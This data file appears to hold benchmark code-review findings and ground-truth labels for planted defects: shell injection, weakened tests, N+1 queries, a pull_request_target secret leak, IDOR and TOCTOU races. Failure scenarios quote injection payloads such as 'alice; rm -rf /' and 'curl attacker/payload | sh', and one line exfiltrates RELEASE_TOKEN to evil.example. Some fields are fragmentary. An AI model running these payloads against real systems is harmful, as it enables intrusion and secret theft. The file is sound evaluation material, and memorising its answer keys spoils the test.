findings.body: The change replaces a safe argv-list invocation with an f-string run through shell=True. user_name is interpolated directly into the shell command, so any shell metacharacters in it are executed by /bin/sh. The previous list form passed user_name as a single argument and was not vulnerable.
findings.failure_scenario: A caller passes user_name like "alice; rm -rf /" or "alice$(curl evil.sh)"; the shell interprets it and arbitrary attacker commands execute with the process's privileges.
findings.title: Fix command injection by passing an argument list instead of a shell string

findings.body: The function previously returned rows unchanged; it now returns rows[1:], dropping the first element. The commit message says "preserve report behavior", so this is a behavior change that contradicts the stated intent, and nothing in the diff explains why the first row is removed.
findings.failure_scenario: A caller passing ["first", "second"] now receives ["second"]; the first row's data is silently lost for every caller.
findings.title: Drop the rows[1:] slice that silently discards the first row

findings.body: The spec requires that rendering shall preserve every input row in order. The previous test asserted exactly that (output equals ["first", "second"]); the replacement only checks the result is not None, so a regression in report.py that drops, reorders, or mutates rows would pass this test. If the implementation changed intentionally, the test should still assert the row-preservation contract rather than a weaker existence check.
findings.failure_scenario: If render_report is later changed to return a filtered or reordered list, the test suite still passes while the spec's row-preservation requirement is silently violated.
findings.title: Test weakened: no longer verifies rows are preserved in order

findings.body: The change replaces the argument-vector invocation with an f-string run through shell=True. A user_name containing shell metacharacters (e.g. "alice; rm -rf /" or "$(...)" ) is executed by the shell. This directly contradicts the committed spec: "Report commands shall use an argument vector without a shell."
findings.failure_scenario: An attacker supplies a crafted user_name; the shell interprets it as an extra command and arbitrary code runs with the report process's privileges.
findings.title: Fix the shell injection: run the report command without a shell

findings.body: The original test asserted render_report returns the input rows; the replacement only asserts the result is not None, which passes even if rows are dropped, reordered, or corrupted. This removes real coverage of the function's documented behaviour.
findings.failure_scenario: A regression in render_report that drops or mutates rows would pass the suite, shipping broken output silently.
findings.title: Weakened test no longer verifies rows are preserved

findings.body: The old code returned every item from repository.load_many(item_ids). The new code calls repository.load per id and appends only items where item.active and item.owner is not None and item.owner.enabled. Unless callers expect this filtering, results silently shrink, and the N+1 load pattern is slower than the batch call.
findings.failure_scenario: A caller passing ids of inactive or owner-disabled items previously received those items back; now they are silently dropped, and each id triggers a separate repository.load call instead of one batched load_many.
findings.title: Behavior change: filtering and per-item loading replace load_many

findings.body: repository.load(item_id) may return None for a missing id (the code already guards item.owner for None, suggesting Optionals are expected). If load can return None, item.active raises AttributeError. If load is guaranteed non-None elsewhere, this can be dismissed.
findings.failure_scenario: An item_id that does not resolve to an item causes AttributeError on item.active, crashing enrich instead of skipping the id.
findings.suggestion: if item is not None and item.active:
findings.title: item.active dereferenced without a None guard on item

expected.label: repository lookup runs once per item
nested eligibility checks obscure one predicate
single-use result-list factory adds needless indirection

findings.body: The path is validated with canonicalize/strip_prefix, then opened in a separate step. If an attacker can modify the directory (e.g. swap a symlink component) between the check and the open, File::open may follow a path that no longer matches the validated candidate. On platforms that support it, opening with openat2/RESOLVE_BENEATH or O_NOFOLLOW-style flags closes this window; if the threat model excludes concurrent directory modification, this is acceptable.
findings.failure_scenario: A concurrent attacker replaces a path component with a symlink after canonicalize but before File::open, causing a file outside root to be opened.
findings.title: TOCTOU gap between canonicalize and File::open

findings.body: The previous implementation called repository.loadMany(ids) once; the new loop awaits repository.load(id) one id at a time, serializing network/DB round trips. For large id lists this multiplies latency by the number of ids and changes the repository API contract from batch to per-item.
findings.failure_scenario: With 100 ids and 50ms per load, enrich now takes ~5s instead of one batched call's ~50ms, degrading every caller that passes many ids.
findings.title: Sequential per-id loads replace batched loadMany (N+1)

findings.body: Previously enrich returned every item the repository loaded for the given ids; now items that are inactive, ownerless, or have a disabled owner are silently dropped, and callers expecting one result per id will see fewer. If this narrowing is intentional, confirm all callers handle the missing entries; if not, filter at the call sites instead.
findings.failure_scenario: A caller that indexes results by position or expects a result for each requested id gets a shorter list and may misattribute items or crash on a missing entry.
findings.title: Silent behavior change: enrich now filters results

findings.body: The old code returned every loaded item; the new code drops items that are inactive, have a null owner, or have a disabled owner. Callers relying on enrich to return all requested items will now silently receive a subset, with no way to distinguish 'not found' from 'filtered out'.
findings.failure_scenario: A caller enriching ['a','b'] where 'b' is inactive now receives a 1-element list and may treat 'b' as missing, breaking downstream logic that expects one result per id.
findings.title: Silent filtering changes enrich's returned results

findings.body: ResultListFactory.create() is a static factory with one caller that just returns an empty list — speculative indirection with no configurability. A literal empty list literal is clearer.
findings.title: Drop the single-caller ResultListFactory abstraction

findings.anchor: Future<List<Item>> enrich(List<String> ids, Repository repository) async {
findings.body: Previously enrich returned every item the repository loaded for the given ids. The new implementation filters to only items that are active, have a non-null owner, and whose owner is enabled. Unless this narrowing is the intent of the change, callers that relied on receiving all requested items will now see results silently missing. If the filtering is intended, it deserves a name/doc that says so (e.g. loadActiveWithEnabledOwner) and a note in the function's doc comment.
findings.failure_scenario: A caller requests ids [a, b, c] where b is inactive; enrich returns only [a, c] with no indication anything was dropped, so downstream logic that assumes one result per id misbehaves.
findings.title: enrich now silently drops inactive/disabled items — confirm callers expect this

findings.body: The new code runs /bin/sh -c with the user value concatenated into the command string. Any shell metacharacter in user (e.g. "; rm -rf /" or "$(...)") is interpreted by the shell, giving arbitrary command execution. The previous ProcessBuilder form passed user as a separate argument without a shell; the rewrite reintroduces the injection. Even with ProcessBuilder, prefer passing arguments as separate array elements rather than building a shell string.
findings.failure_scenario: A request with user="alice; curl attacker/payload | sh" causes the shell to execute the attacker's command with the service's privileges.
findings.title: Fix OS command injection by passing user as an argument, not via shell

findings.body: The commit message says rows are preserved, but render now returns rows.subList(1, rows.size()), silently discarding the first row. It also throws IndexOutOfBoundsException for an empty list and returns a view backed by the caller's list rather than a copy.

findings.title: subList drops the first row, contradicting 'preserve rows' intent

findings.body: The renamed test replaces an equality check on the rendered rows with a bare assertNotNull. Since render now returns rows.subList(1, rows.size()), the assertion-free style means any wrong slicing, ordering, or content change passes as long as a non-null list is returned.

findings.body: The previous implementation made one batch call (repository.loadMany(ids)); the new loop issues one repository.load(id) call per id. For large id lists this multiplies repository round-trips (or queries) by the list size, a significant efficiency regression in the hot enrichment path.

findings.body: Switching the trigger to pull_request_target makes this workflow run in the context of the base repository, so the RELEASE_TOKEN secret is available. The workflow then checks out the pull request head SHA and runs `npm test` — arbitrary attacker-controlled code from the fork — with that secret in the environment. This is the classic GitHub Actions privilege-escalation pattern: any fork can open a PR and exfiltrate the token. The commit message 'plant github-actions-security-v1' confirms this is an intentionally planted vulnerability, not an accident.
findings.failure_scenario: An attacker forks the repo, opens a PR whose test script prints $RELEASE_TOKEN (or posts it to an external server); the workflow runs on pull_request_target with secrets available, leaking the release token to the attacker.
findings.title: pull_request_target runs untrusted PR code with access to secrets

findings.body: RELEASE_TOKEN is passed as an environment variable to npm test, which executes code from the pull request head. For fork PRs this code is attacker-controlled, so the secret can be read and exfiltrated. Even with the current trigger, any change that lets PR code run in this step turns the secret over to untrusted authors.
findings.failure_scenario: A malicious PR adds code in its test suite that logs or transmits process.env.RELEASE_TOKEN; the workflow leaks the release token to the attacker.
findings.title: Secret injected into step running untrusted fork code

findings.body: The previous implementation delegated to repository.load_many(item_ids), a single batched call. The new loop calls repository.load(item_id) once per id, turning one repository round-trip into N, and silently drops whatever batching/caching load_many provided.

findings.title: Per-item repository.load replaces batched load_many (N+1)

findings.body: The old code returned every loaded item. The new code appends only items where item.active and item.owner is not None and item.owner.enabled. Callers relying on enrich returning all items will now see a filtered subset, and items with no owner are dropped entirely. If this filtering is the intended new behavior it should be stated; nothing in the stated intent explains it.
findings.failure_scenario: A caller passing ids of inactive or ownerless items previously got those items back; after this change they are silently omitted, changing downstream results without any stated reason.
findings.title: Silent behavior change: results are now filtered

findings.body: PurePath(user_id).name strips everything before the last path separator, so an id like "admin/42" (or on Windows-style input, "admin\\42") is silently rewritten to "42". If any stored user id contains a separator, the query returns a different user's row — an IDOR-style authorization break. It also breaks lookups for any legitimate id containing '/' or '\\', and the normalization is platform-dependent (PurePath uses NTPath semantics on Windows, PosixPath elsewhere), so the same input resolves differently per host.
findings.failure_scenario: An attacker calls find_user with user_id="known_prefix/target_id"; the name component "target_id" is queried instead, returning another user's record without authorization.
findings.title: Path-normalizing user_id can resolve to a different user's record

findings.body: The original code returned repo.loadMany(ids) — all items for the given ids. The new code issues one awaited repo.load(id) per id in a serial loop (an N+1 round-trip pattern) and additionally drops any item that is not active, has no owner, or whose owner is not enabled. Unless this filtering is the explicit goal, callers now receive a subset of the data they used to get, and latency grows linearly with ids.length instead of one batched call.
findings.failure_scenario: A caller passing 100 ids now triggers 100 sequential network/database round-trips, and previously-returned items that are inactive or have a disabled owner silently disappear from the result, breaking downstream consumers that expect all requested ids.
findings.title: Batch load replaced with sequential per-id loads and silent filtering

findings.title: Signature change breaks source compatibility, contradicting stated intent

findings.body: The containment check happens on the path canonicalized at check time, but File::open re-resolves the path afterwards. If an attacker can modify the directory (e.g. swap a symlink component) between canonicalize() and open(), the opened file may differ from the one that was validated. On Linux the robust fix is opening with O_NOFOLLOW / openat2 RESOLVE_BENEATH (e.g. via the cap-std or openat crates) rather than check-then-open. If the threat model excludes concurrent modification of the directory, this can be accepted as-is.
findings.failure_scenario: An attacker with write access to a directory under root replaces a path component with a symlink after canonicalize() but before open(), causing the function to open a file outside root.
findings.title: TOCTOU race between canonicalize and File::open

findings.body: The spec requires report commands to pass user names as arguments without a shell. This change instead builds the string 'report --user $user' and runs it via 'sh -c', so any shell metacharacter in `user` is executed. findings.body: The spec states rendering shall preserve every row, but the new code returns rows.sublist(1), silently discarding the first row. Callers will lose data, and an empty list will throw a RangeError.
findings.failure_scenario: renderReport('alice', ['first', 'second']) returns ['second'] instead of both rows; with an empty rows list it throws RangeError, crashing the caller.
findings.title: sublist(1) drops the first row, violating the spec's row preservation

findings.body: The test previously asserted the exact list returned by renderReport; it now only checks isNotNull, which passes even if the function returns the wrong rows, an empty list, or a differently-sliced result. Since the implementation changed to return rows.sublist(1), the assertion should pin the exact expected output.

findings.body: The commit claims to 'keep fetchUser callers compatible', but the signature changes from Map<String, Object?> fetchUser(String id, [int timeoutMs = 30000]) to a record-returning function with a required timeoutMs parameter. findings.failure_scenario: Any existing caller invoking fetchUser('id') without the timeout argument, or reading 'fetchedAt'/'timeoutMs' from the result, fails to compile or gets a runtime KeyError-style failure after this change merges.

findings.body: The change replaces the previous single `repository.loadMany(ids)` call with a loop issuing one `repository.load(id)` call per id. findings.body: The old code returned every item for the given ids via repository.loadMany(ids). The new code drops items that are inactive, have a null owner, or have a disabled owner. findings.failure_scenario: A caller enriches ids where one item's owner is disabled; that item silently disappears from the result, changing downstream behavior without any error.

findings.body: Switching the trigger to pull_request_target makes the workflow run in the context of the base repository, so it gets access to secrets (RELEASE_TOKEN) even for pull requests from forks. The checkout step then explicitly checks out the pull request head commit (github.event.pull_request.head.sha), meaning arbitrary attacker-controlled code from a fork is executed with RELEASE_TOKEN in its environment. A malicious PR can simply print the token or exfiltrate it via a network call during npm test. This is a classic CI privilege-escalation pattern.
findings.failure_scenario: An attacker opens a fork PR whose test script reads $RELEASE_TOKEN and posts it to an external server; the workflow runs on pull_request_target, checks out the fork's head SHA, and hands the secret to the attacker's code.
findings.title: pull_request_target runs untrusted PR code with access to secrets

findings.body: The RELEASE_TOKEN secret is injected into the environment of a step that runs tests from the pull request head commit (checked out via github.event.pull_request.head.sha). For fork PRs this executes attacker-controlled code with the token, allowing full theft and abuse of the token's privileges.
findings.failure_scenario: A fork PR adds `curl -d "$RELEASE_TOKEN" evil.example` to a test script; when the workflow runs, the token is exfiltrated.
findings.title: Expose RELEASE_TOKEN to untrusted fork code

findings.body: Switching to `pull_request_target` runs this workflow in the context of the base branch with read/write-eligible secrets, while checking out the pull request head (`ref: ${{ github.event.pull_request.head.sha }}`) and then executing `npm test` from that untrusted code with `RELEASE_TOKEN` in the environment. Any fork can open a PR whose test scripts exfiltrate the token. This is the classic pull_request_target privilege-escalation pattern.
findings.failure_scenario: An attacker forks the repo, adds a script that prints/POSTs $RELEASE_TOKEN to a server, and opens a PR; the workflow runs on pull_request_target, checks out the attacker's commit, runs npm test with the secret in env, and the token is stolen.
findings.title: Expose secrets to untrusted PR code via pull_request_target

findings.body: The workflow now runs on pull_request_target, which executes with a write-scoped GITHUB_TOKEN even for PRs from forks. In this privileged context, invoking actions/labeler by mutable tag (@v6) means a compromised or force-moved tag would run attacker-influenced code with write access to pull requests. Pin third-party actions to a full commit SHA.
findings.failure_scenario: If the v6 tag on actions/labeler is ever hijacked or repointed, arbitrary code runs in CI with a write token on every pull request, allowing labels/PR state to be tampered with or secrets in scope to be exfiltrated.
findings.title: Pin actions/labeler to a commit SHA in a pull_request_target workflow

findings.body: The commit message ("plant github-actions-clean-context-v1") bears no relation to this change, and the change silently converts the workflow from pull_request to pull_request_target while granting pull-requests: write. pull_request_target runs in the context of the base repository and can be triggered by forks, so any job steps that check out or execute code from the PR head would run with write access to repository labels and, via the GITHUB_TOKEN, a path to further tampering. If the intent is only to let actions/labeler apply labels, this is the standard pattern, but it is a security-relevant permissions change smuggled in under an unrelated commit message and should be explicitly justified.
findings.failure_scenario: A fork-originated PR triggers the workflow in the base-repo context with a write-scoped token; any subsequent step that builds or executes PR-supplied code (now or added later) gains write access to the repository's PR metadata.
findings.title: Unexplained switch to pull_request_target with PR write permissions

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1

The new code calls repository.load(item_id) once per id inside a loop, multiplying repository round-trips by the number of item_ids and changing the repository contract the function was written against.
findings.failure_scenario: With N item_ids the function now issues N separate repository loads instead of one batch call; for large N this degrades latency and load on the repository, and any batch-level semantics of load_many (ordering, error handling for missing ids) are silently lost.
findings.title: Batch load_many replaced with per-item load (N+1)

findings.body: datetime.utcnow() is deprecated since Python 3.12 and returns a naive datetime, which loses timezone information and can cause incorrect comparisons or serialization downstream. The removed code correctly used datetime.now(UTC); the UTC import was dropped in this change, so it must be restored.
findings.failure_scenario: When run on Python 3.12+, utcnow() emits a DeprecationWarning and returns a naive datetime; consumers comparing it against timezone-aware timestamps (e.g. from datetime.now(UTC)) get wrong results or raise TypeError.
findings.title: Replace deprecated datetime.utcnow() with timezone-aware now()

findings.body: `datetime.utcnow()` returns a timezone-naive datetime and is deprecated since Python 3.12. The removed code used `datetime.now(UTC)`, which is timezone-aware. Mixing naive datetimes with aware ones downstream causes comparison TypeErrors, and naive UTC timestamps can be misinterpreted as local time.
findings.failure_scenario: A caller compares fetched_at (naive) with a timezone-aware datetime and gets TypeError: can't compare offset-naive and offset-aware datetimes, or records a timestamp that is silently misinterpreted as local time.
findings.title: Replace deprecated naive datetime.utcnow() with timezone-aware now

findings.body: PurePath(user_id).name strips everything before the last path separator, so an ID like "alice/bob" resolves to "bob" and "..\\carol" resolves to "carol" (PurePath on Windows-style input treats backslash as a separator too). If user IDs are arbitrary strings, a caller can supply a crafted ID and the query returns a different user's row than requested — a broken-lookup/IDOR behavior change. If the intent was to sanitize a filename, this transformation is being applied to a database key where it silently rewrites the identifier.
findings.failure_scenario: An attacker calls find_user(conn, "known_prefix/victim_id"); the normalization reduces it to "victim_id" and the query returns the victim's record instead of failing, or legitimate IDs containing '/' or '\\' silently stop resolving.
findings.title: Path-normalizing user_id can look up a different user (IDOR)

findings.body: userName is interpolated directly into a shell command string and executed with execSync, which spawns a shell. An attacker-controlled userName such as "x; rm -rf /" or "$(curl evil.sh)" executes arbitrary commands. The previous spawnSync with an argument array did not have this flaw. Use execFileSync (or spawnSync) with the argument array form so the input is never interpreted by a shell.
findings.failure_scenario: A request supplies userName containing shell metacharacters; execSync runs the injected command with the privileges of the process, giving remote code execution.
findings.title: Fix command injection by passing arguments as an array to execFileSync

findings.body: The function previously returned rows unchanged; the new rows.slice(1) silently discards the first row. This is an unexplained behavior change that will corrupt every caller's report output, and the updated test no longer catches it because it only asserts toBeDefined().
findings.failure_scenario: A caller passes ["header", "row1"] and receives ["row1"], losing the first report row in all downstream output.
findings.title: Restore returning all rows instead of silently dropping the first

findings.body: The test was renamed and its toEqual assertion replaced with toBeDefined, which passes for any non-undefined return value. Combined with the new rows.slice(1) behavior in renderReport, the test no longer verifies the function's output at all and will not catch regressions like the off-by-one slice or a wrong return value.
findings.failure_scenario: A future change that returns the wrong rows (or drops rows entirely, returning undefined is the only failure caught) passes the suite silently.
findings.title: Restore the assertion the weakened test removed

findings.body: std::mem::uninitialized() is deprecated and produces undefined behavior: scratch is read as a fully initialized UserRecord and passed to UserRecord::merge without ever being constructed. Reading uninitialized memory can miscompile, leak arbitrary bytes (including sensitive data from prior stack contents) into the returned record, or crash. This is memory-unsafety in safe-looking public API code.

findings.body: The commit message says 'keep fetch_user source compatible', but the function's signature changes from (id, Option<u64>) -> UserRecord to (id, u64) -> (UserRecord, u64), and the default 30_000 timeout is dropped. Every existing caller passing Option<u64> or expecting a bare UserRecord will fail to compile.
findings.failure_scenario: Any caller written against the old API (e.g. fetch_user("u1", None)) no longer compiles, contradicting the stated compatibility intent.
findings.title: Signature change breaks source compatibility claimed by the commit

findings.body: The old code passed timeout_ms (defaulting to 30_000) into UserRecord::new; the new code ignores it when building the record and merely echoes it back in the tuple, so the timeout no longer affects the fetch.
findings.failure_scenario: A caller passing a short timeout still gets a record built without it, silently changing behaviour while appearing to honour the parameter.

findings.body: The user-supplied string is interpolated into a shell command and executed via `sh -c`, so any shell metacharacters in `user` (e.g. `alice; rm -rf /` or `$(...)`) are interpreted by the shell. The previous code passed `user` as a separate argv element, which was safe; this change introduces OS command injection.
findings.failure_scenario: An attacker supplies a `user` value containing shell syntax; `sh -c` executes arbitrary commands with the privileges of the process.
findings.title: Fix command injection by passing user as an argument, not via shell

findings.body: The test was changed from an exact equality assertion on the returned rows to `isNotNull`, which passes even if `renderReport` returns the wrong data. Since the implementation now returns `rows.sublist(1)`, the assertion no longer pins down the actual output contract, so a regression in row handling would ship silently.
findings.title: Weakened test no longer verifies the returned rows

findings.body: The old implementation used repository.loadMany(ids) in a single call; the new loop issues one repository.load(id) await per id, so cost and latency scale linearly with the number of ids and serialize the round-trips.

findings.title: Restore batched loading — per-id load is an N+1

findings.body: The new filter excludes items where owner is null (and inactive/disabled ones). If callers previously relied on enrich() returning every loaded item, this is a silent behavior change. findings.failure_scenario: A valid item whose owner is null no longer appears in the result, so downstream consumers silently lose data.
findings.title: Items with a null owner are silently dropped

findings.body: A static factory that returns an empty list has a single caller and adds an abstraction with no benefit; the standard empty list literal does the same directly.

findings.body: Importing 'dart:html' makes this library compile only for the web. Any Flutter mobile/desktop/server or pure-Dart consumer of client.dart now fails to compile, and dart:html is deprecated in favor of package:web. If this code was previously platform-agnostic, this is a breaking change.
findings.failure_scenario: A non-web target (Flutter iOS/Android, server, CLI) imports this client and the build fails with 'Dart library dart:html is not available on this platform'.
findings.title: dart:html import breaks all non-web platforms

findings.anchor: (Map<String, Object?>, int) fetchUser(String id, int timeoutMs) {
findings.body: The commit claims to 'keep fetchUser callers compatible', but the function's return type changes from Map<String, Object?> to a record (Map, int), and the optional positional timeoutMs parameter becomes required. Every existing caller expecting a Map with 'id', 'timeoutMs', and 'fetchedAt' keys will break at compile time or runtime.
findings.failure_scenario: Any existing caller doing fetchUser(id) or treating the result as a map (e.g. result['fetchedAt']) fails to compile or throws, directly contradicting the stated intent.
findings.title: Signature and return-type change breaks caller compatibility

findings.body: The doc contract promised a map containing 'id', 'timeoutMs', and 'fetchedAt'. The new record returns a map with only 'id' and 'origin', silently removing the timestamp and timeout fields that downstream consumers likely read.
findings.failure_scenario: Callers reading result['fetchedAt'] or result['timeoutMs'] get null at runtime, causing null-errors or incorrect audit/timing data.
findings.title: Dropped 'fetchedAt' and 'timeoutMs' breaks the map return contract

ground_truth.commit_message: refactor: keep fetchUser callers compatible

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: The new PreparedStatement is created per call and never closed, so JDBC statement resources (and any server-side handles) accumulate until GC. The previous createStatement() had the same shape, but this change is the right place to fix it with try-with-resources.
findings.failure_scenario: Under sustained traffic, unclosed statements exhaust database or connection-pool resources, causing query failures or connection exhaustion.
findings.title: PreparedStatement is never closed, leaking statement resources

findings.body: The query now matches on userId.trim().toLowerCase(). If user IDs are case-sensitive (or stored with mixed case and compared case-sensitively in the database collation), lookups for IDs that were previously found will now miss. If case-insensitive matching is intended, it would be safer to rely on the column's collation or use LOWER(id) = ? consistently on both sides.
findings.failure_scenario: A caller passes 'User-42' while the row stores 'user-42' (or vice versa under a case-sensitive collation); the query returns no row where the previous code path returned one.
findings.title: Lowercasing the userId may break case-sensitive identifiers

ground_truth.clean_trap: User-controlled text reaches a SQL operation only through PreparedStatement.setString, so it cannot alter query syntax.

findings.body: The change replaces a safely-argumented exec.Command with `sh -c` and string concatenation of `user` into the shell command line. Any metacharacter in `user` (e.g. `alice; rm -rf /`) is executed by the shell, giving arbitrary command execution. The previous form passed `user` as a separate argv element with no shell interpretation.
findings.failure_scenario: A caller passes user="alice; curl evil.sh | sh"; the shell executes the injected command with the process's privileges.
findings.title: Fix command injection by passing user as an argument

findings.body: The renamed test only checks that Render does not return nil. The previous assertions on length and element values are removed, so a regression that drops, reorders, or corrupts rows would pass. The implementation (report.go) is not shown, so the nil check may also be trivially satisfied by an empty non-nil slice.
findings.failure_scenario: If Render starts returning a slice with wrong or missing rows, the test still passes and the regression ships unnoticed.
findings.title: Weakened test no longer asserts row contents

findings.body: The spec requires rendering to preserve every row, and the previous implementation returned rows unchanged. The new rows[1:] discards the first element, and on an empty slice it panics with a slice-bounds error.
findings.failure_scenario: Render("alice", []string{}) panics (index out of range), and any non-empty input loses its first row from the rendered report.
findings.title: Restore row preservation: rows[1:] silently drops the first row

findings.body: The previous implementation delegated to repo.LoadMany(ids), a single batched call. The rewrite issues repo.Load(id) once per id inside the loop, so the number of backend round-trips scales linearly with the input size.
findings.failure_scenario: With a large ids slice, the function performs one repository/backend call per id, multiplying latency and load compared to the single batched LoadMany call it replaced.
findings.title: Load one item per id instead of batching

findings.body: The previous implementation returned every item from repo.LoadMany(ids). The new loop filters on item.Active and item.Owner.Enabled, so inactive or disabled-owner items are silently omitted from the result. Callers that relied on receiving an item for every id (or on preserving input order/completeness) now get fewer results with no error or signal. If filtering is intended, it is a material behavior change that should be stated and tested; if not, it is a correctness regression.
findings.failure_scenario: A caller passes ids of items where one has Active=false; Enrich returns fewer items than ids with no indication anything was skipped, breaking callers that index or match results by position or expect one item per id.
findings.title: Enrich silently drops inactive/disabled items, changing prior behavior

findings.body: Switching the trigger to pull_request_target makes the workflow run in the context of the base branch with access to repository secrets, while the checkout is pinned to the pull request's head SHA — attacker-controlled code. The RELEASE_TOKEN is then injected into the environment of `npm test`, which executes that untrusted code. A malicious PR can print the token or exfiltrate it, and because pull_request_target runs automatically without approval, no maintainer interaction is required. This is the classic GitHub Actions privilege-escalation pattern (github-actions-security-v1).
findings.failure_scenario: An attacker opens a PR whose test script reads process.env.RELEASE_TOKEN and sends it to an external server; the workflow runs automatically on pull_request_target and leaks the secret.
findings.title: pull_request_target with head checkout exposes secrets to untrusted PR code

This is the classic pull_request_target + head-checkout privilege-escalation pattern.

findings.body: The validation rejects only the literal string "0.0.0.0/0", but any other CIDR that exposes SSH to the internet or far broader networks passes: e.g. "0.0.0.0/1", "1.0.0.0/8", "::/0" (if IPv6 is ever added), or a typo like "10.2.0.0/16". The guard gives false assurance that admin access cannot be public. Strengthen the condition, e.g. require the CIDR to be inside the intended corporate range with cidrcontains-style logic, or at minimum reject any CIDR whose network encompasses large public space.
findings.failure_scenario: A user sets admin_cidr = "0.0.0.0/1" (or any broad public CIDR); validation passes, terraform apply opens port 22 to half the IPv4 internet despite the 'cannot be public' rule.
findings.title: Block only exact "0.0.0.0/0"; equivalent public CIDRs pass validation

findings.body: The new variable is a public, tunable input controlling SSH ingress, but it has no description explaining its purpose or constraint. A short description documents the security intent for future operators.
findings.suggestion:
variable "admin_cidr" {
  type        = string
  description = "CIDR range allowed SSH (port 22) admin access; must not be public."
  default     = "10.20.0.0/16"
findings.title: Add a description to the new admin_cidr variable
